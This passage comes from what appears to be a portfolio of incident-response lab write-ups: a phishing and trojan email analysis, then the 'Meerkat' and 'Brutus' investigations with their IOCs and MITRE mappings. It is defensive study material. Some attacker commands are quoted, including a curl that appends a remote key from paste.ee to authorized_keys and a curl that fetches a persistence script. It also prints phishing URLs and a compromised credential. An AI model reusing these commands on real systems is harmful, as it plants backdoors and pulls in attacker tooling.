+<table><thead><tr><th>Parameter</th><th>Extracted Artifact / Value</th></tr></thead><tbody><tr><td><strong>Sender Address</strong></td><td><code>QPE77756@mun.ca</code></td></tr><tr><td><strong>Recipient</strong></td><td><code>jack.tractive@abcindustries.co.uk</code></td></tr><tr><td><strong>Subject</strong></td><td><code>Your Amazon.co.uk order of "ION Audio Turntable."</code></td></tr><tr><td><strong>Timestamp</strong></td><td><code>19 Apr 2017 12:35:58 +0000</code></td></tr><tr><td><strong>Originating IP</strong></td><td><code>68.114.190.29</code></td></tr><tr><td><strong>Reverse DNS</strong></td><td><code>mtaout004-public.msg.strl.va.charter.net</code></td></tr><tr><td><strong>Phishing URL</strong></td><td><code>http://id820update.refundsys59.co.uk/invoice103amz/index.php?email=jack.tractive@abcindustries.co.uk</code></td></tr><tr><td><strong>Root Domain</strong></td><td><code>refundsys59.co.uk</code></td></tr></tbody></table>
+<p><img src="https://d2y9h8w1ydnujs.cloudfront.net/uploads/content/images/25dd77632c48891c888d02f7ef0b7a48e13963257c2ab366985d1a05bb6046280e07870a2a6c3bcafe94d31aae01.PNG" alt=""></p>
+<p><img src="https://d2y9h8w1ydnujs.cloudfront.net/uploads/content/images/00ac2c0303da4239d91c4d1e57fe4c6661875ec2380880bf797a530750bcf832bb84df496ee8ed833543835a79c0.PNG" alt=""></p>
+<hr>
+<h4 id="incident-2-nhs-covid-19-trojan-delivery-artifacts">Incident #2: NHS COVID-19 Trojan Delivery Artifacts</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Parameter</th><th>Extracted Artifact / Value</th></tr></thead><tbody><tr><td><strong>Sender Address</strong></td><td><code>FSDFAS2423N23K@gmail.com</code></td></tr><tr><td><strong>Recipient</strong></td><td><code>matthew.beaman@abcindustries.co.uk</code></td></tr><tr><td><strong>Subject</strong></td><td><code>COVID19 - GET TESTED NOW!</code></td></tr><tr><td><strong>Timestamp</strong></td><td><code>12 Jun 2020 20:23:00 UTC</code></td></tr><tr><td><strong>Originating IP</strong></td><td><code>209.85.160.173</code> (Google Mail Server <code>mail-io1-f173.google.com</code>)</td></tr><tr><td><strong>Payload Name</strong></td><td><code>COVID19_TEST_FORM.pdf.exe</code> (Disguised via double extension)</td></tr><tr><td><strong>SHA256 Hash</strong></td><td><code>8b2e701e91101955c73865589a4c72999aeabc11043f712e05fdb1c17c4ab19a</code></td></tr><tr><td><strong>VirusTotal Detection</strong></td><td><strong>58/70 Security Vendors</strong> (Identified as Trojan payload)</td></tr></tbody></table>
+<p><img src="https://d2y9h8w1ydnujs.cloudfront.net/uploads/content/images/3117e611026b04b26d419231f9db0e4cf902bafebb7ec5d5c6a1b3b3baebb42147c6d9fc8dd4ddd47ce71aae569f.PNG" alt=""></p>
+<p><img src="https://d2y9h8w1ydnujs.cloudfront.net/uploads/content/images/10d2476d5fdf85559b59d52056bccbd062660d93adb7ae0731757fba9e4d6696a3fd9d4d766f92770748b486edf7.PNG" alt=""></p>
+<hr>
+<h2 id="indicators-of-compromise-iocs">Indicators of Compromise (IOCs)</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Indicator</th><th>Type</th><th>Threat Classification / Context</th></tr></thead><tbody><tr><td><code>QPE77756@mun.ca</code></td><td>Email Address</td><td>Malicious Phishing Sender (Spoofed Amazon)</td></tr><tr><td><code>FSDFAS2423N23K@gmail.com</code></td><td>Email Address</td><td>Malicious Trojan Delivery Sender (Spoofed NHS)</td></tr><tr><td><code>68.114.190.29</code></td><td>IPv4 Address</td><td>Malicious Mail Relay / Host Server</td></tr><tr><td><code>refundsys59.co.uk</code></td><td>Domain</td><td>Credential Harvesting Infrastructure</td></tr><tr><td><code>8b2e701e91101955c73865589a4c72999aeabc11043f712e05fdb1c17c4ab19a</code></td><td>SHA256 Hash</td><td>Trojan Binary (<code>.pdf.exe</code>)</td></tr></tbody></table>
+<hr>
+<h2 id="defensive-engineering--recommendations">Defensive Engineering &#x26; Recommendations</h2>
+<h3 id="1-secure-email-gateway-seg-controls">1. Secure Email Gateway (SEG) Controls</h3>
+<ul>
+<li><strong>Domain &#x26; Sender Blocking:</strong> Blacklist <code>QPE77756@mun.ca</code>, <code>FSDFAS2423N23K@gmail.com</code>, and the <code>refundsys59.co.uk</code> root domain.</li>
+<li><strong>Attachment Enforcement:</strong> Implement strict policy rules blocking executables disguised via double extensions (e.g., <code>*.pdf.exe</code>, <code>*.doc.exe</code>).</li>
+<li><strong>Brand Protection:</strong> Configure rules to flag external emails from non-official domains that impersonate major service providers (Amazon, NHS, Microsoft).</li>
+</ul>
+<h3 id="2-network--dns-layer-defense">2. Network &#x26; DNS Layer Defense</h3>
+<ul>
+<li><strong>DNS Sinkholing / Web Proxy:</strong> Block domain <code>refundsys59.co.uk</code> and URL paths associated with the credential harvester across perimeter firewalls and DNS resolvers.</li>
+<li><strong>IP Reputation Filtering:</strong> Rate-limit and filter traffic originating from low-reputation mail relays.</li>
+</ul>
+<h3 id="3-endpoint-detection--response-edr">3. Endpoint Detection &#x26; Response (EDR)</h3>
+<ul>
+<li><strong>Hash Blocklist:</strong> Distribute SHA256 <code>8b2e701e91101955c73865589a4c72999aeabc11043f712e05fdb1c17c4ab19a</code> to enterprise EDR agents to terminate any execution attempts.</li>
+<li><strong>User Awareness:</strong> Provide targeted phishing simulations reinforcing caution around unexpected urgency lures and invoice refund links.</li>
+</ul> </div> </div> </article><article class="lab-card cyber-frame p-6 sm:p-8 transition-all" data-lab-id="meerkat-pcap-and-log-analysis"> <!-- Top Badges / Meta --> <div class="flex flex-wrap items-center justify-between gap-3 pb-4 border-b border-[var(--border-subtle)]"> <div class="flex flex-wrap items-center gap-2"> <span class="font-mono text-[0.65rem] font-bold px-3 py-1 bg-[var(--bg-elevated)] border border-[var(--border-frame)] text-[var(--accent-active)] tracking-wider uppercase"> HTB Sherlock / DFIR </span> <span class="font-mono text-[0.65rem] font-bold px-2.5 py-1 bg-[var(--accent-progress)]/10 border border-[var(--accent-progress)]/30 text-[var(--accent-progress)] tracking-wider uppercase"> Intermediate </span> </div> <span class="font-mono text-xs text-[var(--text-muted)]"> 10 August 2026 </span> </div> <!-- Title & Summary Toggle Area --> <div class="py-5 cursor-pointer lab-toggle group" role="button" tabindex="0" aria-expanded="false"> <div class="flex items-start justify-between gap-4"> <div> <h2 class="text-xl sm:text-2xl font-extrabold text-[var(--text-primary)] group-hover:text-[var(--accent-active)] transition-colors cyber-glitch" data-text="Meerkat — Network PCAP &#38; Suricata Log Triage"> Meerkat — Network PCAP &amp; Suricata Log Triage </h2> <p class="text-sm text-[var(--text-body)] mt-2 leading-relaxed"> Full network forensic investigation analyzing Suricata alert logs and packet captures (PCAP): credential stuffing detection, Bonitasoft authorization bypass (CVE-2022-25237), malicious RCE API payload upload, and SSH backdoor persistence. </p> <div class="flex flex-wrap gap-1.5 mt-4"> <span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> Wireshark </span><span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> Jq </span><span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> Suricata Logs </span><span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> Browserling </span><span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> MITRE ATT&amp;CK </span> </div> </div> <button type="button" class="shrink-0 p-2.5 border border-[var(--border-frame)] bg-[var(--bg-surface)] text-[var(--text-primary)] group-hover:border-[var(--text-primary)] transition-all lab-toggle-btn mt-1 cursor-pointer" aria-label="Toggle full lab writeup"> <span class="font-mono text-xs font-bold block"> ▼ READ REPORT </span> </button> </div> </div> <!-- Expandable Report Body Content --> <div class="lab-body overflow-hidden transition-all duration-500 hidden"> <div class="pt-6 border-t border-[var(--border-subtle)] lab-markdown text-sm sm:text-base"> <h2 id="1-introduction--scenario">1. Introduction &#x26; Scenario</h2>
+<ul>
+<li><strong>Sherlock Name:</strong> Meerkat</li>
+<li><strong>Investigative Premise:</strong> Network Packet Analysis &#x26; Suricata JSON Log Triage</li>
+</ul>
+<blockquote>
+<p><strong>Scenario Context:</strong> You are brought in as the new security provider for <em>Forela</em>, a fast-growing startup using a business management platform with insufficient documentation and potentially lax security practices. Provided with network packet capture (PCAP) data and Suricata alert logs, your objective is to determine if a system compromise occurred, map the attacker’s attack path, and document all Indicators of Compromise (IOCs).</p>
+</blockquote>
+<hr>
+<h2 id="2-tools--analysis-environment">2. Tools &#x26; Analysis Environment</h2>
+<ul>
+<li><strong><code>jq</code></strong> — JSON command-line parser used for filtering, aggregating, and sorting Suricata alert outputs.</li>
+<li><strong>Wireshark</strong> — Deep network packet inspection for HTTP streams, TCP conversations, payload extraction, and protocol reconstruction.</li>
+<li><strong>Browserling</strong> — Isolated sandboxed browser for safe external infrastructure verification.</li>
+<li><strong>MITRE ATT&#x26;CK</strong> — Threat intelligence mapping for observed tactics and techniques.</li>
+</ul>
+<h3 id="essential-jq-log-parsing-queries">Essential <code>jq</code> Log Parsing Queries:</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># View and inspect Suricata alerts schema</span></span>
+<span class="line"><span style="color:#B392F0">jq</span><span style="color:#9ECBFF"> .</span><span style="color:#9ECBFF"> meerkat-alerts.json</span><span style="color:#E1E4E8"> </span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Extract and count unique alert signatures</span></span>
+<span class="line"><span style="color:#B392F0">jq</span><span style="color:#9ECBFF"> '.[].alert.signature'</span><span style="color:#9ECBFF"> meerkat-alerts.json</span><span style="color:#79B8FF"> -r</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> sort</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> uniq</span><span style="color:#79B8FF"> -c</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> sort</span><span style="color:#79B8FF"> -nr</span><span style="color:#E1E4E8"> </span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Extract and aggregate source IP addresses</span></span>
+<span class="line"><span style="color:#B392F0">jq</span><span style="color:#9ECBFF"> '.[].src_ip'</span><span style="color:#9ECBFF"> meerkat-alerts.json</span><span style="color:#79B8FF"> -r</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> sort</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> uniq</span><span style="color:#79B8FF"> -c</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> sort</span><span style="color:#79B8FF"> -nr</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Correlate source IPs with triggered alert signatures</span></span>
+<span class="line"><span style="color:#B392F0">jq</span><span style="color:#79B8FF"> -r</span><span style="color:#9ECBFF"> '.[] | "\(.src_ip) \(.alert.signature)"'</span><span style="color:#9ECBFF"> meerkat-alerts.json</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> sort</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> uniq</span><span style="color:#79B8FF"> -c</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> sort</span><span style="color:#79B8FF"> -nr</span></span></code></pre>
+<h3 id="essential-wireshark-display-filters">Essential Wireshark Display Filters:</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span># Filter traffic by specific suspect IP</span></span>
+<span class="line"><span>ip.addr == 156.146.62.213</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Filter specific IP and isolate HTTP application streams</span></span>
+<span class="line"><span>(ip.addr == 156.146.62.213) &#x26;&#x26; (http)</span></span></code></pre>
+<hr>
+<h2 id="3-executive-summary--attack-timeline">3. Executive Summary &#x26; Attack Timeline</h2>
+<p>An external threat actor conducted a targeted compromise against Forela’s internal business management platform running <strong>Bonitasoft</strong>.</p>
+<ol>
+<li><strong>Credential Stuffing:</strong> The attacker launched an automated brute force/stuffing attack against the <code>/loginservice</code> endpoint, successfully discovering valid credentials for user <code>seb.broom@fella.co.uk</code> (<code>government</code>).</li>
+<li><strong>Exploitation &#x26; Authorization Bypass:</strong> Leveraging <strong>CVE-2022-25237</strong> via the <code>i18nTranslation</code> API endpoint, the adversary bypassed access controls and uploaded a malicious API extension (<code>rce_api_extension.zip</code>).</li>
+<li><strong>Remote Code Execution &#x26; Staging:</strong> The uploaded extension executed arbitrary system commands (<code>whoami</code>, <code>wget</code>), retrieving a staging script from <code>paste.ee</code>.</li>
+<li><strong>Persistence:</strong> The malicious payload appended an external rogue SSH public key to <code>/home/ubuntu/.ssh/authorized_keys</code> and restarted the SSH daemon.</li>
+<li><strong>Interactive Access:</strong> The attacker subsequently established an interactive inbound SSH session from <code>95.181.232.30</code>.</li>
+</ol>
+<hr>
+<h2 id="4-indicators-of-compromise-iocs">4. Indicators of Compromise (IOCs)</h2>
+<h3 id="network-indicators">Network Indicators</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Indicator</th><th>Type</th><th>Description / Role</th></tr></thead><tbody><tr><td><code>156.146.62.213</code></td><td>IPv4 Address</td><td><strong>Primary Attacker IP:</strong> Reconnaissance, Credential Stuffing, and initial exploitation trigger (<code>whoami</code>).</td></tr><tr><td><code>138.99.59.221</code></td><td>IPv4 Address</td><td><strong>Secondary Attacker IP:</strong> Staging payload delivery execution (<code>wget</code>).</td></tr><tr><td><code>95.181.232.30</code></td><td>IPv4 Address</td><td><strong>Inbound SSH IP:</strong> Attacker connecting via SSH using the planted rogue key.</td></tr><tr><td><code>paste.ee</code></td><td>Domain</td><td><strong>C2 / Staging Infrastructure:</strong> Text-sharing platform hosting malicious bash staging script.</td></tr><tr><td><code>fella.co.uk:8080</code></td><td>Domain / Host</td><td>Compromised internal target server hosting Bonitasoft.</td></tr></tbody></table>
+<h3 id="host-file--endpoint-artifacts">Host, File &#x26; Endpoint Artifacts</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Artifact</th><th>Type</th><th>Description</th></tr></thead><tbody><tr><td><code>CVE-2022-25237</code></td><td>Vulnerability</td><td>Bonitasoft Authorization Bypass &#x26; Remote Code Execution (RCE).</td></tr><tr><td><code>i18nTranslation</code></td><td>URI String</td><td>String appended to API endpoints to bypass authorization filters.</td></tr><tr><td><code>rce_api_extension.zip</code></td><td>File</td><td>Malicious API extension zip uploaded to achieve command execution.</td></tr><tr><td><code>hfffGR4unv</code></td><td>File Name / ID</td><td>Attacker public key identifier retrieved from <code>paste.ee</code>.</td></tr><tr><td><code>/home/ubuntu/.ssh/authorized_keys</code></td><td>File Path</td><td>Backdoored SSH key store modified for persistence.</td></tr></tbody></table>
+<h3 id="compromised-credentials--authentication-evidence">Compromised Credentials &#x26; Authentication Evidence</h3>
+<ul>
+<li><strong>Compromised Account:</strong> <code>seb.broom@fella.co.uk</code> (URL decoded from <code>seb.broom%40fella.co.uk</code>)</li>
+<li><strong>Compromised Password:</strong> <code>government</code></li>
+<li><strong>Authentication Status Code:</strong> HTTP <code>204 No Content</code> (Successful authentication; all failed attempts returned HTTP <code>401 Unauthorized</code>).</li>
+<li><strong>Total Credential Stuffing Attempts:</strong> <strong>56</strong> distinct username/password combinations across 118 POST requests.</li>
+</ul>
+<hr>
+<h2 id="5-cyber-kill-chain--mitre-attck-mapping">5. Cyber Kill Chain &#x26; MITRE ATT&#x26;CK Mapping</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>[ Credential Stuffing (T1110.004) ] ──> [ CVE-2022-25237 Auth Bypass (T1190) ]</span></span>
+<span class="line"><span>                                                       │</span></span>
+<span class="line"><span>                                                       ▼</span></span>
+<span class="line"><span>[ Ingress Tool Transfer / Staging (T1105) ] &#x3C;── [ Malicious API Zip Upload (T1203) ]</span></span>
+<span class="line"><span>                    │</span></span>
+<span class="line"><span>                    ▼</span></span>
+<span class="line"><span>[ SSH Authorized Keys Persistence (T1098.004) ] ──> [ Direct Ingress Access (T1021.004) ]</span></span></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Attack Stage</th><th>MITRE ATT&#x26;CK Technique</th><th>ID</th><th>Observables / Evidence</th></tr></thead><tbody><tr><td><strong>Credential Access</strong></td><td>Brute Force: Credential Stuffing</td><td><strong>T1110.004</strong></td><td>56 automated <code>POST</code> requests to Bonita <code>/loginservice</code> using <code>Python-requests</code> user agent.</td></tr><tr><td><strong>Initial Access / Execution</strong></td><td>Exploit Public-Facing Application</td><td><strong>T1190</strong></td><td>Authorization bypass on Bonitasoft via <code>i18nTranslation</code> endpoint parameter (<strong>CVE-2022-25237</strong>).</td></tr><tr><td><strong>Command &#x26; Control</strong></td><td>Ingress Tool Transfer</td><td><strong>T1105</strong></td><td>HTTP <code>GET</code> request executing <code>wget</code> to retrieve a remote script hosted on <code>paste.ee</code>.</td></tr><tr><td><strong>Persistence</strong></td><td>Account Manipulation: SSH Authorized Keys</td><td><strong>T1098.004</strong></td><td>Script appended external SSH key to <code>/home/ubuntu/.ssh/authorized_keys</code> and ran <code>sudo service ssh restart</code>.</td></tr><tr><td><strong>Lateral Movement</strong></td><td>Remote Services: SSH</td><td><strong>T1021.004</strong></td><td>Subsequent inbound SSH connection established from <code>95.181.232.30</code>.</td></tr></tbody></table>
+<hr>
+<h2 id="6-detailed-evidence-analysis">6. Detailed Evidence Analysis</h2>
+<h3 id="suricata-alert-analysis-meerkat-alertsjson">Suricata Alert Analysis (<code>meerkat-alerts.json</code>)</h3>
+<p>High volume of alerts triggered for:</p>
+<ul>
+<li><code>USER_AGENT Python-requests</code></li>
+<li><code>Possible Staging for CVE-2022-25237</code> (Bonitasoft)</li>
+<li><code>ATTACK_RESPONSE Possible /etc/passwd</code></li>
+</ul>
+<h3 id="network-packet-analysis-meerkatpcap">Network Packet Analysis (<code>meerkat.pcap</code>)</h3>
+<ol>
+<li><strong>Recon &#x26; Credential Stuffing:</strong> Attacker IP <code>156.146.62.213</code> generated 118 POST requests to Bonita’s login endpoint. Analysis revealed 56 unique username/password pairs tested.</li>
+<li><strong>Exploitation:</strong> Successful login observed for <code>seb.broom@fella.co.uk</code> / <code>government</code> (HTTP status <code>204</code>).</li>
+<li><strong>Payload Upload &#x26; Execution:</strong> The attacker used <code>i18nTranslation</code> to upload <code>rce_api_extension.zip</code> and executed system checks (<code>whoami</code>).</li>
+<li><strong>Persistence Routine:</strong> From IP <code>138.99.59.221</code>, a <code>wget</code> command fetched a shell script from <code>paste.ee</code>. The script contained:
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> https://paste.ee/r/.../hfffGR4unv</span><span style="color:#F97583"> >></span><span style="color:#9ECBFF"> /home/ubuntu/.ssh/authorized_keys</span></span>
+<span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> service</span><span style="color:#9ECBFF"> ssh</span><span style="color:#9ECBFF"> restart</span></span></code></pre>
+</li>
+<li><strong>Interactive Access:</strong> Shortly after execution, IP <code>95.181.232.30</code> initiated an active SSH session to the server.</li>
+</ol> </div> </div> </article><article class="lab-card cyber-frame p-6 sm:p-8 transition-all" data-lab-id="brutus-ssh-brute-force"> <!-- Top Badges / Meta --> <div class="flex flex-wrap items-center justify-between gap-3 pb-4 border-b border-[var(--border-subtle)]"> <div class="flex flex-wrap items-center gap-2"> <span class="font-mono text-[0.65rem] font-bold px-3 py-1 bg-[var(--bg-elevated)] border border-[var(--border-frame)] text-[var(--accent-active)] tracking-wider uppercase"> HTB Sherlock / DFIR </span> <span class="font-mono text-[0.65rem] font-bold px-2.5 py-1 bg-[var(--accent-progress)]/10 border border-[var(--accent-progress)]/30 text-[var(--accent-progress)] tracking-wider uppercase"> Easy </span> </div> <span class="font-mono text-xs text-[var(--text-muted)]"> 3 August 2026 </span> </div> <!-- Title & Summary Toggle Area --> <div class="py-5 cursor-pointer lab-toggle group" role="button" tabindex="0" aria-expanded="false"> <div class="flex items-start justify-between gap-4"> <div> <h2 class="text-xl sm:text-2xl font-extrabold text-[var(--text-primary)] group-hover:text-[var(--accent-active)] transition-colors cyber-glitch" data-text="Brutus — Unix SSH Brute-Force &#38; Post-Exploitation Analysis"> Brutus — Unix SSH Brute-Force &amp; Post-Exploitation Analysis </h2> <p class="text-sm text-[var(--text-body)] mt-2 leading-relaxed"> Analysis of a Linux Confluence server breach via SSH brute-force. Investigated auth.log and wtmp artifacts to trace credential access, privilege escalation, persistence via local account creation, and post-exploitation script execution. </p> <div class="flex flex-wrap gap-1.5 mt-4"> <span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> auth.log </span><span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> wtmp </span><span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> utmp.py </span><span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> MITRE ATT&amp;CK </span> </div> </div> <button type="button" class="shrink-0 p-2.5 border border-[var(--border-frame)] bg-[var(--bg-surface)] text-[var(--text-primary)] group-hover:border-[var(--text-primary)] transition-all lab-toggle-btn mt-1 cursor-pointer" aria-label="Toggle full lab writeup"> <span class="font-mono text-xs font-bold block"> ▼ READ REPORT </span> </button> </div> </div> <!-- Expandable Report Body Content --> <div class="lab-body overflow-hidden transition-all duration-500 hidden"> <div class="pt-6 border-t border-[var(--border-subtle)] lab-markdown text-sm sm:text-base"> <h2 id="scenario">Scenario</h2>
+<p>In this Sherlock, we investigate a <strong>Confluence server</strong> that was brute-forced via its SSH service. After gaining access, the attacker performed additional activities including privilege escalation, persistence through local account creation, and downloading an external reconnaissance script. The investigation leverages <strong>auth.log</strong> and <strong>wtmp</strong> artifacts to reconstruct the full attack chain.</p>
+<hr>
+<h2 id="tools--artifacts">Tools &#x26; Artifacts</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Artifact</th><th>Description</th></tr></thead><tbody><tr><td><code>auth.log</code></td><td>Linux authentication log — tracks SSH login attempts, <code>sudo</code> actions, user creation events, and session IDs</td></tr><tr><td><code>wtmp</code></td><td>Binary login/logout record — provides precise session connection timelines and durations</td></tr><tr><td><code>utmp.py</code></td><td>Python utility for decoding <code>wtmp</code> binary on cross-architecture forensic workstations</td></tr></tbody></table>
+<hr>
+<h2 id="understanding-the-artifacts">Understanding the Artifacts</h2>
+<h3 id="authlog">auth.log</h3>
+<p>Primarily used for tracking authentication mechanisms. Whenever a user attempts to login, switch users, or perform any task that requires authentication, an entry is made in this log file. This includes activities involving <code>sshd</code> (SSH daemon), <code>sudo</code> actions, and cron jobs requiring authentication.</p>
+<p><strong>Key fields in auth.log:</strong></p>
+<ul>
+<li><strong>Date and Time</strong> — timestamp of the event</li>
+<li><strong>Hostname</strong> — system where the event occurred</li>
+<li><strong>Service</strong> — daemon reporting the event (e.g., <code>sshd</code>)</li>
+<li><strong>PID</strong> — Process ID of the service</li>
+<li><strong>User</strong> — username involved in authentication</li>
+<li><strong>Authentication Status</strong> — success or failure details</li>
+<li><strong>IP Address/Hostname</strong> — source of remote connections</li>
+<li><strong>Message</strong> — detailed event description including error codes</li>
+</ul>
+<h3 id="wtmp">wtmp</h3>
+<p>Records all login and logout events on the system. It is a binary file typically located at <code>/var/log/wtmp</code>. Provides the history of user logins/logouts, system reboots, and runlevel changes.</p>
+<p><strong>Key fields in utmp.py output:</strong></p>
+<ul>
+<li><strong>Type</strong> — record type (login, logout, boot, shutdown)</li>
+<li><strong>PID</strong> — Process ID related to the event</li>
+<li><strong>Line</strong> — terminal line (<code>tty</code> or <code>pts</code>)</li>
+<li><strong>User</strong> — username associated with the event</li>
+<li><strong>Host</strong> — source hostname or IP address</li>
+<li><strong>Session</strong> — session ID</li>
+<li><strong>sec</strong> — event timestamp (presented in forensic workstation timezone)</li>
+</ul>
+<blockquote>
+<p><strong>Note:</strong> When the CPU architecture of the forensic investigator’s system differs from the source system, built-in tools like <code>last</code> or <code>utmpdump</code> may produce incorrect output. The provided <code>utmp.py</code> tool handles cross-architecture decoding.</p>
+</blockquote>
+<hr>
+<h2 id="step-by-step-investigation">Step-by-Step Investigation</h2>
+<h3 id="1-identifying-the-brute-force-source">1. Identifying the Brute-Force Source</h3>
+<p><strong>Q: What is the IP address used by the attacker to carry out the brute-force attack?</strong></p>
+<p>Analysis of <code>auth.log</code> revealed a high volume of failed SSH authentication attempts originating from a single IP address:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span># Repeated failed password entries in auth.log from:</span></span>
+<span class="line"><span>65.2.161.68</span></span></code></pre>
+<p><strong>Answer:</strong> <code>65.2.161.68</code></p>
+<hr>
+<h3 id="2-compromised-account-identification">2. Compromised Account Identification</h3>
+<p><strong>Q: The brute-force attempts were successful — what is the username of the compromised account?</strong></p>
+<p>After numerous failed attempts, the attacker successfully authenticated to the <code>root</code> account.</p>
+<p><strong>Answer:</strong> <code>root</code></p>
+<hr>
+<h3 id="3-interactive-session-timestamp">3. Interactive Session Timestamp</h3>
+<p><strong>Q: Identify the UTC timestamp when the attacker logged in manually and established a terminal session.</strong></p>
+<p>The <code>wtmp</code> artifact confirms the interactive session start time. The login time differs from the authentication time — <code>wtmp</code> records the actual terminal session establishment.</p>
+<p><strong>Answer:</strong> <code>2024-03-06 06:32:45</code></p>
+<hr>
+<h3 id="4-ssh-session-number">4. SSH Session Number</h3>
+<p><strong>Q: What is the session number assigned to the attacker’s session?</strong></p>
+<p>SSH login sessions are tracked and assigned a session number upon login.</p>
+<p><strong>Answer:</strong> <code>37</code></p>
+<hr>
+<h3 id="5-persistence--backdoor-account">5. Persistence — Backdoor Account</h3>
+<p><strong>Q: The attacker added a new user as part of their persistence strategy. What is the name of this account?</strong></p>
+<p>Attackers often create new user accounts for persistence — maintaining unauthorized access without additional tooling, essentially “living off the land.” The <code>auth.log</code> shows user creation events:</p>
+<p><strong>Answer:</strong> <code>cyberjunkie</code></p>
+<hr>
+<h3 id="6-mitre-attck-sub-technique">6. MITRE ATT&#x26;CK Sub-Technique</h3>
+<p><strong>Q: What is the MITRE ATT&#x26;CK sub-technique ID used for persistence by creating a new account?</strong></p>
+<p><strong>Answer:</strong> <code>T1136.001</code> — Create Account: Local Account</p>
+<hr>
+<h3 id="7-session-termination">7. Session Termination</h3>
+<p><strong>Q: What time did the attacker’s first SSH session end according to auth.log?</strong></p>
+<p><strong>Answer:</strong> <code>2024-03-06 06:37:24</code></p>
+<hr>
+<h3 id="8-post-exploitation-command">8. Post-Exploitation Command</h3>
+<p><strong>Q: The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?</strong></p>
+<p>The attacker logged into the <code>cyberjunkie</code> backdoor account and used <code>sudo</code> to fetch a Linux persistence/enumeration script:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">/usr/bin/curl</span><span style="color:#9ECBFF"> https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span></span></code></pre>
+<hr>
+<h2 id="evidence--iocs">Evidence &#x26; IOCs</h2>
+<h3 id="network-indicators">Network Indicators</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Indicator</th><th>Type</th><th>Description</th></tr></thead><tbody><tr><td><code>65.2.161.68</code></td><td>IP Address</td><td>Attacker source IP — SSH brute-force origin</td></tr><tr><td><code>https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</code></td><td>URL</td><td>External persistence/enumeration script fetched via <code>curl</code></td></tr></tbody></table>
+<h3 id="host-indicators">Host Indicators</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Indicator</th><th>Type</th><th>Description</th></tr></thead><tbody><tr><td><code>root</code></td><td>Account</td><td>Initially compromised account via brute-force</td></tr><tr><td><code>cyberjunkie</code></td><td>Account</td><td>Backdoor persistence account created by attacker</td></tr><tr><td><code>linper.sh</code></td><td>Script</td><td>Linux persistence/enumeration toolkit downloaded post-exploitation</td></tr></tbody></table>
+<hr>
+<h2 id="mitre-attck-mapping">MITRE ATT&#x26;CK Mapping</h2>
+
+
+
+
+
+
+
+
+
+
+
+
